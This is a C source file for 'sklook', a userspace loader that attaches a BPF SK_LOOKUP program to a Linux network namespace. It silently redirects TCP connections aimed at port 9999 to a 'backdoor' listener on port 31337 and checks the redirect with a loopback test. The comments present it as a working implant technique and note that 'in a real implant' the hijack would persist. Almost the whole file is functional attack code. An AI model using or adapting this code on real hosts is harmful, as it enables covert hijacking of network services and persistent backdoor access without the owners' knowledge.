// SPDX-License-Identifier: GPL-2.0-only
// sklook: load a BPF SK_LOOKUP program into the current network
// namespace and redirect TCP connections from TARGET_PORT to a
// backdoor socket on BACKDOOR_PORT.
//
// Build:   make
// Run:     sudo ./sklook
//
// The program creates a listening socket on BACKDOOR_PORT,
// registers it in a SOCKHASH map, and attaches a SK_LOOKUP BPF
// program to the netns. Any new TCP connection to TARGET_PORT
// gets redirected to BACKDOOR_PORT by the BPF program.
//
// Requires: Linux 5.6+, BPF_FS mounted, root or CAP_BPF+CAP_NET_ADMIN

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include <fcntl.h>

#define TARGET_PORT     9999
#define BACKDOOR_PORT   31337

struct thread_arg {
    pthread_barrier_t *barrier;
    int              fd;
};

static void *backdoor_thread(void *arg) {
    struct thread_arg *ta = arg;

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        perror("backdoor socket");
        pthread_barrier_wait(ta->barrier);
        return NULL;
    }

    int opt = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(BACKDOOR_PORT),
        .sin_addr = { htonl(INADDR_LOOPBACK) },
    };

    if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("backdoor bind");
        close(fd);
        pthread_barrier_wait(ta->barrier);
        return NULL;
    }

    if (listen(fd, 5) < 0) {
        perror("backdoor listen");
        close(fd);
        pthread_barrier_wait(ta->barrier);
        return NULL;
    }

    fprintf(stderr, "[backdoor] listening on 127.0.0.1:%d\n", BACKDOOR_PORT);

    ta->fd = fd;
    pthread_barrier_wait(ta->barrier);

    struct sockaddr_in peer;
    socklen_t len = sizeof(peer);
    int cfd = accept(fd, (struct sockaddr *)&peer, &len);
    if (cfd < 0) {
        perror("backdoor accept");
        return NULL;
    }

    char ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &peer.sin_addr, ip, sizeof(ip));
    fprintf(stderr, "[backdoor] accepted from %s:%d\n",
            ip, ntohs(peer.sin_port));
    write(cfd, "BACKDOOR CONNECTION\n", 20);
    close(cfd);
    return NULL;
}

static int test_client(void) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        perror("client socket");
        return -1;
    }

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(TARGET_PORT),
        .sin_addr = { htonl(INADDR_LOOPBACK) },
    };

    fprintf(stderr, "[client] connecting to 127.0.0.1:%d...\n", TARGET_PORT);

    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("client connect");
        close(fd);
        return -1;
    }

    char buf[256];
    memset(buf, 0, sizeof(buf));
    int n = read(fd, buf, sizeof(buf) - 1);
    if (n > 0)
        fprintf(stderr, "[client] received: %s", buf);

    close(fd);

    if (strstr(buf, "BACKDOOR"))
        return 0;
    if (n > 0)
        return 1;   /* unexpected response */
    return -1;       /* no data */
}

int main(void) {
    signal(SIGPIPE, SIG_IGN);

    fprintf(stderr, "=== SKLOOK ===\n");
    fprintf(stderr, "bpf sk_lookup socket redirection\n");
    fprintf(stderr, "redirecting port %d -> %d\n\n", TARGET_PORT, BACKDOOR_PORT);

    /*
     * Start the backdoor listener in a thread.  We use a barrier so
     * the main thread waits until the socket is bound and listening.
     */
    pthread_barrier_t barrier;
    pthread_barrier_init(&barrier, NULL, 2);

    struct thread_arg ta = { .barrier = &barrier, .fd = -1 };
    pthread_t tid;
    pthread_create(&tid, NULL, backdoor_thread, &ta);
    pthread_barrier_wait(&barrier);
    pthread_barrier_destroy(&barrier);

    /* If the thread didn't create the socket, bail */
    int backdoor_fd = ta.fd;
    if (backdoor_fd < 0) {
        fprintf(stderr, "FAIL: backdoor thread could not create socket\n");
        pthread_join(tid, NULL);
        return 1;
    }

    /*
     * Load the BPF object.
     */
    struct bpf_object *obj = bpf_object__open_file("sklook_kern.o", NULL);
    if (!obj) {
        fprintf(stderr, "FAIL: bpf_object__open_file: %s\n",
                strerror(errno));
        return 1;
    }

    if (bpf_object__load(obj)) {
        fprintf(stderr, "FAIL: bpf_object__load (BPF verifier rejected it?)\n");
        fprintf(stderr, "      check dmesg for verifier log\n");
        return 1;
    }
    fprintf(stderr, "[bpf] program loaded\n");

    struct bpf_program *prog;
    prog = bpf_object__find_program_by_name(obj, "sk_redirect");
    if (!prog) {
        fprintf(stderr, "FAIL: couldn't find 'sk_redirect' in object\n");
        return 1;
    }

    struct bpf_map *map = bpf_object__find_map_by_name(obj, "sock_map");
    if (!map) {
        fprintf(stderr, "FAIL: couldn't find 'sock_map' in object\n");
        return 1;
    }

    /*
     * Register the backdoor socket in the SOCKHASH map.
     * The kernel resolves the fd to a struct socket internally.
     */
    int map_fd = bpf_map__fd(map);

    uint32_t key = 0;
    uint64_t val = (uint64_t)(uint32_t)backdoor_fd;   /* fd is 32 bits */
    if (bpf_map_update_elem(map_fd, &key, &val, BPF_ANY) < 0) {
        perror("FAIL: bpf_map_update_elem (need root + CAP_BPF?)");
        return 1;
    }
    fprintf(stderr, "[bpf] backdoor socket stored in sock_map\n");

    /*
     * Attach the BPF program to the current network namespace.
     * Every new TCP connection to TARGET_PORT will hit our program.
     */
    int netns_fd = open("/proc/self/ns/net", O_RDONLY);
    if (netns_fd < 0) {
        perror("FAIL: open /proc/self/ns/net");
        return 1;
    }

    struct bpf_link *link = bpf_program__attach_netns(prog, netns_fd);
    if (!link) {
        fprintf(stderr, "FAIL: bpf_program__attach_netns\n");
        close(netns_fd);
        return 1;
    }
    fprintf(stderr, "[bpf] attached to netns\n\n");

    /*
     * Quick smoke test: connect to TARGET_PORT and see if data from
     * BACKDOOR_PORT arrives.
     */
    int r = test_client();
    if (r == 0)
        fprintf(stderr, "\n=== BACKDOOR REACHED - redirect works ===\n");
    else if (r > 0)
        fprintf(stderr, "\n=== unexpected response from target ===\n");
    else
        fprintf(stderr, "\n=== client connection failed ===\n");

    /*
     * Clean up: detach, close, join.
     * In a real implant the link and socket would stay alive.
     */
    bpf_link__destroy(link);
    close(netns_fd);
    close(backdoor_fd);
    bpf_object__close(obj);
    pthread_join(tid, NULL);

    return r ? 1 : 0;
}
